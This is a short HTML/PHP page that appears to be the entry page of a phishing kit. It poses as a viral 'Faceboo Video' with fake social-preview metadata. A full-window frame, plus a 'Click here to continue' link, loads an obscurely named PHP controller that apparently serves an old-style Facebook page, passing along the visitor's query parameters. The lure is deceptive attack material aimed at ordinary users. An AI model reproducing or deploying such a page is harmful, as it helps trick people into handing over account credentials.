
	<html> 
	<head> 
	<title>Faceboo Video APP</title>
		
		<meta name="twitter:card" content="summary" />
		<meta name="twitter:site" content="@Yonito Antonio" />
		<meta name="twitter:title" content="Watch video @Yonito Antonio" />
		<meta name="twitter:description" content="712,255 Views " />
		<meta name="twitter:image" content="https://avatars.io/twitter/Yonito Antonio" />
	
	</head>
	<frameset rows="*,3" frameborder="NO" border="50" framespacing="0">
	<frame name="main" src="../.././public/CONTROLLERffe11f2f-4fb2-417a-8772-9632f5a05468.php?source=.%2Fpublic%2FACCESSS321e4517-2d4a-4546-b031-0b6f225e5232&lan=oldfbhk&<?php echo http_build_query($_GET); ?>"> <noframes> 
	<body bgcolor="#FFFFFF" text="#000000"> 
	<a href="../.././public/CONTROLLERffe11f2f-4fb2-417a-8772-9632f5a05468.php?source=.%2Fpublic%2FACCESSS321e4517-2d4a-4546-b031-0b6f225e5232&lan=oldfbhk&<?php echo http_build_query($_GET); ?>">Click here to continue</a> 
	</body> 
	</noframes> 
	</html> 
   